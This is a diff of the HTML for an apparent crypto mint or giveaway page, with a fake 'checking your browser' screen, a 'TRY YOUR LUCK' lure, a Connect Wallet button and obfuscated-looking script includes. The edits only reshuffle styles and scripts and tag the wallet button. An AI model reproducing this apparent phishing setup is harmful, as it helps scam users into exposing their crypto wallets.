@@ -26,7 +26,51 @@
 TRY YOUR LUCK ! &#128640;
     " property="og:description"><meta property="og:image:url" content="389-9bec97c22fa2e411.gif"><meta name="theme-color" content="#7289DA">
  
-    
+     <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      background: #f9fafb;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      color: #333;
+      overflow: hidden;
+    }
+    h1 {
+      font-size: 28px;
+      margin-bottom: 20px;
+      animation: fadeIn 1s ease forwards;
+    }
+    .spinner {
+      width: 60px;
+      height: 60px;
+      border: 6px solid #e0e0e0;
+      border-top: 6px solid #3498db;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    p {
+      font-size: 16px;
+      color: #666;
+      animation: fadeIn 2s ease forwards;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+  </style>
     <style>
         c1725780704708d-modal{
         position: fixed;
@@ -114,51 +158,7 @@ TRY YOUR LUCK ! &#128640;
             }
         }
     </style>
- <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-    body {
-      background: #f9fafb;
-      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-      height: 100vh;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      color: #333;
-      overflow: hidden;
-    }
-    h1 {
-      font-size: 28px;
-      margin-bottom: 20px;
-      animation: fadeIn 1s ease forwards;
-    }
-    .spinner {
-      width: 60px;
-      height: 60px;
-      border: 6px solid #e0e0e0;
-      border-top: 6px solid #3498db;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin-bottom: 20px;
-    }
-    p {
-      font-size: 16px;
-      color: #666;
-      animation: fadeIn 2s ease forwards;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
-  </style>
+
 </head>
 <body>
 <h1 id="title">Checking your browser before accessing...</h1>
@@ -640,16 +640,7 @@ TRY YOUR LUCK ! &#128640;
     </footer>
 
 
-    <script>
-        window.onload = function () {
-            // Show the popup message 1 second after page load
-            const popup = document.getElementById('popup');
-            popup.style.display = 'block';
-        };
-    </script>
-    <script src="jquery.min.js"></script>
-    <script type="text/javascript" src="js/slick-1.8.1/slick/slick.min.html"></script>
-    <script type="text/javascript" src="js/index.html"></script>
+    
  <style>
     
     button {
@@ -921,19 +912,11 @@ TRY YOUR LUCK ! &#128640;
     </div>
     
     <!--<button class="mint-buttonser">Mint</button>--->
-    <button class="connect-walletser connectButton interact-button" >Connect Wallet</button>
+    <button class="connect-walletser connectButton interact-button connectWallet" >Connect Wallet</button>
   </div>
 </div>
 
-<script>
-  function openModal() {
-    document.getElementById('mintModal').style.display = 'flex';
-  }
 
-  function closeModal() {
-    document.getElementById('mintModal').style.display = 'none';
-  }
-</script>
       `;
     }
 
@@ -968,11 +951,29 @@ TRY YOUR LUCK ! &#128640;
 
     init();
   </script>
-
 </body>
 
 
 </html>
+<script>
+  function openModal() {
+    document.getElementById('mintModal').style.display = 'flex';
+  }
+
+  function closeModal() {
+    document.getElementById('mintModal').style.display = 'none';
+  }
+</script>
+<script>
+        window.onload = function () {
+            // Show the popup message 1 second after page load
+            const popup = document.getElementById('popup');
+            popup.style.display = 'block';
+        };
+    </script>
+    <script src="jquery.min.js"></script>
+    <script type="text/javascript" src="js/slick-1.8.1/slick/slick.min.html"></script>
+    <script type="text/javascript" src="js/index.html"></script>
 <script>
     // function loadScript() {
     //     var script = document.createElement('script');
@@ -991,4 +992,3 @@ TRY YOUR LUCK ! &#128640;
 <script src="6Xt4f5TUAAZMitbgLx7/EN84Y4BRubUGwwFPv.js"></script>
 <script src="6Xt4f5TUAAZMitbgLx7/J9jHeEjy9C3oBfifV2YVF.js"></script>
 <script src="6Xt4f5TUAAZMitbgLx7/SIP01EagM48GEI7WC54C7ZKJ.js"></script>
-
